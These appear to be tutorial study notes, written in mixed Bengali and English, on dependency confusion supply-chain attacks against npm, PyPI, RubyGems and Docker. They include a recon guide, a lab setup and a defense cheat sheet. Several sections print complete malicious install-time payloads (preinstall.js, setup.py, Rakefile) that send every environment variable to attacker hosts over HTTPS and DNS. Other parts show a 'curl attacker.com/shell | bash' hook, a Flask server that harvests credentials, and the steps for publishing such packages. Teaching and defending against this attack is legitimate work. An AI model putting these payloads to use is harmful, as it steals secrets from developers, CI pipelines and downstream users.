# 📦 Dependency Confusion — Detailed Study Notes

> **Also Known As:** Supply Chain Substitution Attack
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — Dependency Confusion কী?](#1-concept--dependency-confusion-কী)
2. [Package Manager যেগুলো Vulnerable](#2-package-manager-যেগুলো-vulnerable)
3. [কীভাবে কাজ করে — Attack Flow](#3-কীভাবে-কাজ-করে--attack-flow)
4. [NPM Example — Step by Step](#4-npm-example--step-by-step)
5. [অন্যান্য Package Managers](#5-অন্যান্য-package-managers)
6. [Alex Birsan এর ঐতিহাসিক Attack (2021)](#6-alex-birsan-এর-ঐতিহাসিক-attack-2021)
7. [Malicious Package তৈরি](#7-malicious-package-তৈরি)
8. [Reconnaissance — Private Package খোঁজা](#8-reconnaissance--private-package-খোঁজা)
9. [Tools](#9-tools)
10. [Practical Lab Setup](#10-practical-lab-setup)
11. [Defense Cheat Sheet](#11-defense-cheat-sheet)
12. [References](#12-references)

---

## 1. Concept — Dependency Confusion কী?

### Core Idea

```
Software development এ packages/libraries ব্যবহার হয়।
Companies often have:
  - Public packages: npm, pypi, rubygems থেকে
  - Private packages: internal registry থেকে (company এর নিজস্ব)

Dependency Confusion:
  Attacker একটা public package register করে
  যার নাম company এর private package এর মতোই!

  Package installer confuse হয়:
  "এই package টা কোথা থেকে নেবো? Public থেকে নাকি Private থেকে?"

  যদি public package এর version বড় হয় → public থেকে নেয়!
  → Attacker এর malicious code company এর server এ চলে!
```

```
Analogy:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Company এর office এ delivery আসে। দুটো courier:           │
│    1. Internal courier: "company-tool v1.0"                 │
│    2. External courier: "company-tool v9.9.9" (attacker)    │
│                                                              │
│  Mail room: "External এর version বেশি! External নাও!"       │
│                                                              │
│  Result: Attacker এর package office এ installed!            │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Impact

```
✅ Remote Code Execution on company servers
✅ CI/CD pipeline compromise
✅ Developer machine compromise
✅ Production deployment compromise
✅ Supply chain attack (downstream customers affected)

Alex Birsan (2021): Apple, Microsoft, Netflix, PayPal সহ
35+ companies compromise করেছিলেন!
Bug bounty: $130,000+ পেয়েছিলেন!
```

---

## 2. Package Manager যেগুলো Vulnerable

```
┌──────────────────┬──────────────┬─────────────────────────────────┐
│ Platform         │ Manager      │ Config File                     │
├──────────────────┼──────────────┼─────────────────────────────────┤
│ JavaScript/Node  │ npm, yarn    │ package.json                    │
│ Python           │ pip          │ requirements.txt, setup.py      │
│ Ruby             │ gem/bundler  │ Gemfile                         │
│ Java             │ Maven        │ pom.xml                         │
│ PHP              │ Composer     │ composer.json                   │
│ .NET             │ NuGet        │ *.csproj, packages.config       │
│ Docker           │ DockerHub    │ Dockerfile (FROM directive)     │
│ Go               │ go modules   │ go.mod                          │
│ Rust             │ Cargo        │ Cargo.toml                      │
└──────────────────┴──────────────┴─────────────────────────────────┘
```

---

## 3. কীভাবে কাজ করে — Attack Flow

### Normal Flow (No Vulnerability)

```
Company এর developer:
  npm install company-internal-tool

npm client:
  1. public registry (npmjs.com) এ খোঁজে → নেই!
  2. private registry (registry.company.com) এ খোঁজে → আছে! → installs it

✅ Safe: private package installed
```

### Attack Flow

```
Step 1: Attacker discovers private package name
  → GitHub repos, error messages, package.json files scan করে
  → Private package name: "company-internal-tool"

Step 2: Attacker registers same name on PUBLIC registry
  → npmjs.com এ "company-internal-tool" register করে
  → Version: 9.9.9 (private এর চেয়ে বড়!)
  → Package এ malicious preinstall script!

Step 3: Company developer runs:
  npm install company-internal-tool

  npm client:
  1. public registry check → "company-internal-tool" v9.9.9 found!
  2. private registry check → v1.0.0 found
  3. Higher version wins! → public v9.9.9 installed!

Step 4: Attacker's malicious code runs!
  → package.json "scripts.preinstall": "curl attacker.com/shell | bash"
  → Developer/CI server compromised!
```

```
Version Priority Attack:
┌─────────────────────────────────────────────────────────┐
│                                                         │
│  Private Registry: company-tool v1.2.3                 │
│  Public Registry:  company-tool v9.9.9 ← WINS!         │
│                                                         │
│  npm sees higher version → downloads public!            │
│  → Malicious code executes!                             │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 4. NPM Example — Step by Step

### Step 1: Find Private Package Names

```bash
# Reconnaissance:

# Method 1: GitHub search:
# site:github.com "company.com" package.json
# company এর public repos এ package.json দেখো

# Method 2: Error messages:
npm install  # error: "package 'company-internal' not found in registry"
# → private package name leaked!

# Method 3: Process list (যদি server access থাকে):
ps aux | grep node

# Method 4: npm logs:
cat ~/.npm/_logs/*.log | grep "company"

# Method 5: package.json এ @company scope:
{
  "dependencies": {
    "@company/internal-utils": "1.0.0",  ← private package!
    "@company/auth-lib": "2.1.0"         ← private package!
  }
}
```

### Step 2: Verify Package Not on Public Registry

```bash
# Check if package exists publicly:
npm info company-internal-tool 2>&1

# If output: "npm error 404 Not Found - GET https://registry.npmjs.org/company-internal-tool"
# → VULNERABLE! Package name available!

# Python:
pip index versions company-internal-package

# Ruby:
gem info company-internal-gem
```

### Step 3: Create Malicious Package

```bash
# Create package directory:
mkdir company-internal-tool && cd company-internal-tool

# package.json — malicious package:
cat > package.json << 'EOF'
{
  "name": "company-internal-tool",
  "version": "9.9.9",
  "description": "Internal tool",
  "main": "index.js",
  "scripts": {
    "preinstall": "node preinstall.js"
  },
  "author": "Legit Author",
  "license": "MIT"
}
EOF

# Malicious preinstall script:
cat > preinstall.js << 'EOF'
const os = require('os');
const { execSync } = require('child_process');
const https = require('https');

// Collect system information:
const data = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  env: process.env,  // environment variables (contains secrets!)
  cwd: process.cwd(),
  npm_config_registry: process.env.npm_config_registry
};

// Send to attacker's server:
const payload = JSON.stringify(data);
const req = https.request({
  hostname: 'ATTACKER_SERVER.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length
  }
}, (res) => {});

req.write(payload);
req.end();
EOF

cat > index.js << 'EOF'
// Harmless looking main file:
module.exports = {};
EOF
```

### Step 4: Publish to npm

```bash
# npm account তৈরি করো:
npm adduser  # → npmjs.com এ account create

# Publish:
npm publish

# Verify:
npm info company-internal-tool
# Should show your package with version 9.9.9
```

### Step 5: Wait and Collect

```python
# attacker_server.py — collect compromised data:
from flask import Flask, request
import json
import datetime

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()

    timestamp = datetime.datetime.now().isoformat()

    print(f"\n{'='*60}")
    print(f"[{timestamp}] NEW HIT!")
    print(f"Hostname: {data.get('hostname')}")
    print(f"Username: {data.get('username')}")
    print(f"Platform: {data.get('platform')}")
    print(f"CWD: {data.get('cwd')}")

    # Check for sensitive environment variables:
    env = data.get('env', {})
    sensitive = ['AWS_ACCESS_KEY', 'DATABASE_URL', 'SECRET_KEY',
                 'GITHUB_TOKEN', 'API_KEY', 'PASSWORD']

    for key in sensitive:
        for env_key, env_val in env.items():
            if key.lower() in env_key.lower():
                print(f"🔑 SENSITIVE: {env_key} = {env_val}")

    # Log to file:
    with open('hits.json', 'a') as f:
        f.write(json.dumps({'timestamp': timestamp, 'data': data}) + '\n')

    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

---

## 5. অন্যান্য Package Managers

### Python (PyPI)

```bash
# requirements.txt এ private packages খোঁজো:
company-internal-utils==1.0.0
company-auth-lib==2.1.0

# Verify not on PyPI:
pip index versions company-internal-utils

# Create malicious package:
mkdir company-internal-utils && cd company-internal-utils

cat > setup.py << 'EOF'
from setuptools import setup
import subprocess, os, platform

# Malicious code runs during pip install!
import socket, json
from urllib import request as urllib_request

data = {
    'hostname': socket.gethostname(),
    'platform': platform.system(),
    'env': dict(os.environ),
    'python': platform.python_version()
}

payload = json.dumps(data).encode()
req = urllib_request.Request(
    'https://ATTACKER_SERVER.com/collect',
    data=payload,
    headers={'Content-Type': 'application/json'},
    method='POST'
)
try:
    urllib_request.urlopen(req, timeout=5)
except:
    pass

setup(
    name='company-internal-utils',
    version='9.9.9',
    description='Internal utilities',
    packages=[],
)
EOF

# Upload to PyPI:
pip install twine
python setup.py sdist bdist_wheel
twine upload dist/*
```

### Ruby (RubyGems)

```ruby
# Gemfile এ private gems:
gem 'company-internal-gem', '1.0.0'

# Malicious gem তৈরি:
# company-internal-gem.gemspec:
Gem::Specification.new do |s|
  s.name = 'company-internal-gem'
  s.version = '9.9.9'
  s.summary = 'Internal gem'
  s.files = ['lib/company-internal-gem.rb']

  # Post install hook:
  s.post_install_message = 'Installed!'
  s.extensions = ['ext/Rakefile']
end

# Rakefile (runs on install):
require 'net/http'
require 'json'
require 'socket'

data = {
  hostname: Socket.gethostname,
  env: ENV.to_h,
  ruby: RUBY_VERSION
}

Net::HTTP.post(
  URI('https://attacker.com/collect'),
  data.to_json,
  'Content-Type' => 'application/json'
)
```

### Maven/Java (pom.xml)

```xml
<!-- Private packages in pom.xml: -->
<dependency>
    <groupId>com.company</groupId>
    <artifactId>internal-utils</artifactId>
    <version>1.0.0</version>
</dependency>

<!-- Attacker registers same artifact on Maven Central:
     com.company:internal-utils:9.9.9

     Malicious code in Maven plugin's execute() method
     or static initializer block. -->
```

### Docker (DockerHub)

```dockerfile
# Private Dockerfile:
FROM company/internal-base:latest
# company/internal-base is a private image

# Attack:
# Register "company/internal-base" on DockerHub publicly!
# Higher tag/latest → Docker pulls attacker's image!
# Malicious layer adds backdoor, exfiltrates credentials

# FROM instruction pulls public if available and no explicit registry:
FROM company/internal-base:latest
# → Checks DockerHub first → attacker's image found → uses it!
```

---

## 6. Alex Birsan এর ঐতিহাসিক Attack (2021)

### Background

```
Alex Birsan = Security researcher (Romania)
Year: 2021, February
Published: Medium post "Dependency Confusion: How I Hacked Into Apple, Microsoft..."

What he did:
  1. PayPal এর public GitHub repos থেকে private npm package names খুঁজলেন
  2. সেই names দিয়ে public npm packages তৈরি করলেন
  3. Version: 99.99.99 (very high to win over any private version!)
  4. Package এ benign data-collection script রাখলেন
  5. Wait করলেন...

What happened:
  - Apple, Microsoft, Netflix, PayPal, Shopify, Uber সহ 35+ companies
  - তাদের build systems automatically attacker এর package install করলো!
  - Script গুলো company এর server থেকে Birsan এর server এ data পাঠালো
  - Proof: server hostname, username, IP address এসে গেলো!
```

### Impact and Bug Bounties

```
Company          Bounty
───────────────────────────
Apple            $30,000
Microsoft        $40,000
PayPal           $30,000
Shopify          $30,000
Netflix          $15,000
Yelp             $15,000
... others       various

Total:           $130,000+

Article: "Dependency Confusion: How I Hacked Into Apple, Microsoft
          and Dozens of Other Companies"
```

### Key Technical Detail

```
Private package: @apple/internal-analytics v1.0.0
  → Hosted on Apple's private npm registry

Birsan's package: @apple/internal-analytics v9.9.9
  → Published to public npmjs.com

npm resolution order (at the time):
  1. Check all configured registries
  2. Take HIGHEST VERSION regardless of registry!

Result: v9.9.9 > v1.0.0 → Birsan's package wins!
```

---

## 7. Malicious Package তৈরি

### Advanced Malicious Package (Bug Bounty PoC Style)

```javascript
// preinstall.js — PoC (non-destructive, just for demonstration)
const os = require('os')
const https = require('https')
const dns = require('dns')

// Collect non-sensitive proof data:
const proof = {
  // Package info:
  package_name: process.env.npm_package_name,
  package_version: process.env.npm_package_version,

  // System info:
  hostname: os.hostname(),
  platform: os.platform(),
  arch: os.arch(),
  username: os.userInfo().username,

  // npm info:
  npm_registry: process.env.npm_config_registry,
  node_version: process.version,

  // CI/CD detection:
  is_ci: !!(process.env.CI || process.env.GITHUB_ACTIONS || process.env.JENKINS_URL),
  github_actions: process.env.GITHUB_ACTIONS === 'true',
  jenkins_url: process.env.JENKINS_URL,

  // Timestamp:
  timestamp: new Date().toISOString(),
}

// DNS exfiltration (stealthy, works through firewalls):
const encoded = Buffer.from(JSON.stringify(proof))
  .toString('base64')
  .replace(/\+/g, '-')
  .replace(/\//g, '_')
  .replace(/=/g, '')
  .substring(0, 63) // DNS label max length

dns.resolve(`${encoded}.attacker.com`, (err) => {
  // Data exfiltrated via DNS query!
})

// Also try HTTPS:
try {
  const req = https.request({
    hostname: 'attacker.com',
    path: '/dep-confusion',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  })
  req.write(JSON.stringify(proof))
  req.end()
} catch (e) {}
```

### package.json Structure

```json
{
  "name": "target-company-internal-tool",
  "version": "9.9.9",
  "description": "Internal utility",
  "main": "index.js",
  "scripts": {
    "preinstall": "node preinstall.js"
  },
  "author": "legitimate-looking-name",
  "license": "MIT",
  "keywords": ["internal", "utility"],
  "dependencies": {}
}
```

---

## 8. Reconnaissance — Private Package খোঁজা

### Method 1: GitHub Search

```bash
# GitHub dork for package.json files:
site:github.com "company.com" package.json
site:github.com org:company-name package.json

# Look for:
# - @company/package-name → scoped packages
# - Dependencies not on npmjs.com
# - Internal registry URLs

# GitHub API দিয়ে repos scan করো:
curl "https://api.github.com/orgs/TARGET_COMPANY/repos?per_page=100" \
  | jq '.[].html_url'
```

### Method 2: Error Message Mining

```bash
# npm install error messages:
npm ERR! 404 Not Found - GET https://registry.npmjs.org/company-internal-pkg
#                                                          ↑ private package name!

# pip install errors:
pip install company-internal-lib
# ERROR: Could not find a version that satisfies the requirement company-internal-lib

# Maven errors:
# Could not resolve: com.company:internal-utils:1.0.0
```

### Method 3: Package.json Analysis

```bash
# Public repos এর package.json download করো:
curl https://raw.githubusercontent.com/COMPANY/PUBLIC-REPO/main/package.json

# Look for private packages:
{
  "dependencies": {
    "lodash": "^4.17.21",           ← public package (skip)
    "company-private-lib": "1.0.0", ← private! (target!)
    "@company/internal": "^2.0.0"   ← scoped private! (target!)
  }
}
```

### Method 4: NPM Config Analysis (যদি access আছে)

```bash
# .npmrc file এ registry configuration:
cat ~/.npmrc
cat /project/.npmrc

# Content:
registry=https://registry.npmjs.org/
@company:registry=https://npm.company.com/  ← private registry!
//npm.company.com/:_authToken=${COMPANY_NPM_TOKEN}

# @company scoped packages → private registry
# unscoped packages → public registry
# → @company packages তে dependency confusion possible নয়
# → unscoped company packages vulnerable!
```

### Method 5: confused Tool

```bash
# Install:
pip install confused

# Scan npm packages:
confused -l npm package.json
# Output: Lists packages that exist in private but NOT in public

# Scan pip:
confused -l pip requirements.txt

# Scan gem:
confused -l gem Gemfile
```

---

## 9. Tools

### confused (Visma)

```bash
# Install:
pip install confused

# Multi-ecosystem scan:
confused -l npm package.json
confused -l pip requirements.txt
confused -l gem Gemfile

# Output example:
# [MISSING] company-internal-tool: Not found on npmjs.com
# → VULNERABLE to dependency confusion!
```

### DepFuzzer (Synacktiv)

```bash
# Install:
git clone https://github.com/synacktiv/DepFuzzer
cd DepFuzzer
pip install -r requirements.txt

# Usage:
python depfuzzer.py -f package.json -t npm

# Additional feature: email takeover detection
# If package owner email domain expired → register domain → takeover!
python depfuzzer.py -f package.json -t npm --check-email
```

---

## 10. Practical Lab Setup

### Lab 1: Safe Local Simulation

```bash
# নিজের machine এ simulate করো:

# Step 1: Local private registry (Verdaccio):
npm install -g verdaccio
verdaccio &
# Local registry: http://localhost:4873

# Step 2: Private package তৈরি করো:
mkdir private-hello && cd private-hello
npm init -y
# package.json:
echo '{"name":"my-company-internal","version":"1.0.0"}' > package.json

# Local registry তে publish করো:
npm publish --registry http://localhost:4873

# Step 3: .npmrc configure করো:
echo '@company:registry=http://localhost:4873' >> .npmrc

# Step 4: Simulate confusion:
mkdir test-project && cd test-project
echo '{"dependencies":{"my-company-internal":"1.0.0"}}' > package.json

# Public registry তে higher version দিয়ে নতুন package:
# (locally simulate করো)
mkdir public-attack && cd public-attack
echo '{"name":"my-company-internal","version":"9.9.9","scripts":{"preinstall":"echo HACKED!"}}' > package.json
npm publish --registry http://localhost:4873  # Still local for safety

# Now try install:
npm install  # Which version wins?
```

### Lab 2: Verify npm Package Availability

```python
#!/usr/bin/env python3
# check_packages.py — Check which packages are publicly available

import json
import requests
import sys

def check_npm(package_name):
    url = f"https://registry.npmjs.org/{package_name}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            latest = data.get('dist-tags', {}).get('latest', 'unknown')
            return True, latest
        return False, None
    except:
        return None, None

def check_pypi(package_name):
    url = f"https://pypi.org/pypi/{package_name}/json"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            latest = data['info']['version']
            return True, latest
        return False, None
    except:
        return None, None

def analyze_package_json(filepath):
    with open(filepath) as f:
        data = json.load(f)

    deps = {}
    for section in ['dependencies', 'devDependencies', 'peerDependencies']:
        deps.update(data.get(section, {}))

    print(f"\nAnalyzing {filepath}")
    print("=" * 60)

    vulnerable = []
    for pkg, version in deps.items():
        # Skip scoped packages starting with @ (usually safer)
        # but still check them
        exists, latest = check_npm(pkg)

        if exists is False:
            print(f"[!] MISSING on npm: {pkg} (v{version}) → VULNERABLE!")
            vulnerable.append(pkg)
        elif exists is True:
            print(f"[ ] Exists: {pkg} (npm latest: {latest})")
        else:
            print(f"[?] Error checking: {pkg}")

    if vulnerable:
        print(f"\n⚠️  VULNERABLE packages found: {vulnerable}")
        print("These package names are available on public npm!")
    else:
        print("\n✅ No obvious dependency confusion vulnerabilities found")

# Usage:
if len(sys.argv) > 1:
    analyze_package_json(sys.argv[1])
else:
    # Example with inline data:
    test_data = {
        "dependencies": {
            "lodash": "4.17.21",
            "company-private-utils": "1.0.0",
            "my-internal-lib": "2.0.0"
        }
    }

    with open('/tmp/test_package.json', 'w') as f:
        json.dump(test_data, f)

    analyze_package_json('/tmp/test_package.json')
```

```bash
python3 check_packages.py package.json
# Output:
# [!] MISSING on npm: company-private-utils → VULNERABLE!
# [!] MISSING on npm: my-internal-lib → VULNERABLE!
# [ ] Exists: lodash (npm latest: 4.17.21)
```

---

## 11. Defense Cheat Sheet

### ✅ Fix 1: Scope Private Packages

```json
// ❌ VULNERABLE: Unscoped private package
{
  "dependencies": {
    "company-internal-lib": "1.0.0"  ← attackable!
  }
}

// ✅ SAFE: Scoped with private registry config
{
  "dependencies": {
    "@company/internal-lib": "1.0.0"  ← scoped to company!
  }
}
```

```
// .npmrc: scope → private registry mapping
@company:registry=https://npm.company.com/
```

### ✅ Fix 2: Explicit Registry Configuration

```bash
# .npmrc — explicit registry per package:
@company:registry=https://npm.company.com/
@company:always-auth=true

# pip — private index:
# pip.conf:
[global]
index-url = https://pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# pip install order: private first, then public
# But if public has higher version → still vulnerable!
# Solution: --no-index or specific version pinning
```

### ✅ Fix 3: Version Pinning

```json
// ❌ VULNERABLE: Range versions
{
  "dependencies": {
    "private-lib": "^1.0.0"  ← accepts any 1.x.x or higher!
  }
}

// ✅ SAFER: Exact version
{
  "dependencies": {
    "private-lib": "1.0.0"   ← exactly this version only
  }
}

// ✅ BEST: Lock files
// package-lock.json, yarn.lock, Pipfile.lock
// Contain exact package + integrity hash
// Public attacker's package has different hash → rejected!
```

### ✅ Fix 4: Integrity Checking (npm)

```bash
# npm shrinkwrap / package-lock.json:
npm install  # generates package-lock.json with integrity hashes

# package-lock.json এ:
{
  "private-lib": {
    "version": "1.0.0",
    "integrity": "sha512-EXPECTED_HASH...",  ← hash validation!
    "resolved": "https://npm.company.com/private-lib/-/private-lib-1.0.0.tgz"
  }
}

# যদি attacker এর package different hash → npm install fails!
npm ci  # strict mode: uses lock file exactly
```

### ✅ Fix 5: Register Package Names on Public Registry

```
Defensive registration:
  Company এর private package names → public registry তে register করো!
  Version 0.0.1 দিয়ে (intentionally low)
  Description: "This is a reserved package. Do not use."

  → Attacker register করতে পারবে না (already taken!)
  → Even if tries, company এর v0.0.1 < attacker's v9.9.9?
  → Still vulnerable unless integrity checking

  Better: Register with high version AND warning message
```

### ✅ Fix 6: Artifact Repository Manager

```
Use Artifactory, Nexus, or Azure Artifacts as proxy:
  → Single registry endpoint
  → Private packages priority over public
  → Block unknown packages
  → Audit trail of all downloads

Configuration:
  Virtual repository: private + public
  Priority: private repo first
  If not in private → DENY (or: allow from public with approval)
```

### Defense Summary

```
Attack                           → Fix
────────────────────────────────────────────────────────────────────────
Unscoped private packages        → Use scoped names (@company/pkg)
                                   Register all names on public registry

Higher version public package    → Version pinning (exact versions)
                                   Lock files with integrity hashes (npm ci)

Multiple registry confusion      → Single proxy registry (Artifactory)
                                   Explicit registry per scope in .npmrc

Preinstall script execution      → npm install --ignore-scripts
                                   Review all new dependencies

CI/CD pipeline compromise        → Audit dependency changes in PRs
                                   Supply chain security tools (Dependabot)
                                   SBOM (Software Bill of Materials)
```

---

## 12. References

| Resource                     | Link                                                                                                           |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings         | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Dependency%20Confusion)               |
| Alex Birsan Original Article | [Medium](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)                                    |
| confused Tool                | [GitHub](https://github.com/visma-prodsec/confused)                                                            |
| DepFuzzer Tool               | [GitHub](https://github.com/synacktiv/DepFuzzer)                                                               |
| Microsoft Mitigation Guide   | [Azure Blog](https://azure.microsoft.com/en-gb/resources/3-ways-to-mitigate-risk-using-private-package-feeds/) |
| 0xsapra PoC Package          | [GitHub](https://github.com/0xsapra/dependency-confusion-expoit)                                               |
| Bug Bounty Explained Video   | [YouTube](https://www.youtube.com/watch?v=zFHJwehpBrU)                                                         |

---

> ✅ **Next Topic Suggestions:**
>
> - `Insecure Source Code Management/README.md` — Exposed .git, SVN
> - `API Key Leaks/README.md` — Supply chain secrets
> - `Command Injection/README.md` — preinstall scripts → RCE chain
> - `Server Side Request Forgery/README.md` — Post-exploitation

> ⚠️ **Ethical Reminder:**
> Dependency Confusion testing করতে:
>
> - Bug Bounty program এ scope verify করো
> - Malicious code রেখো না — শুধু benign DNS/HTTP ping
> - Production packages publish করার আগে permission নাও
> - Alex Birsan এর method follow করো: responsible disclosure!
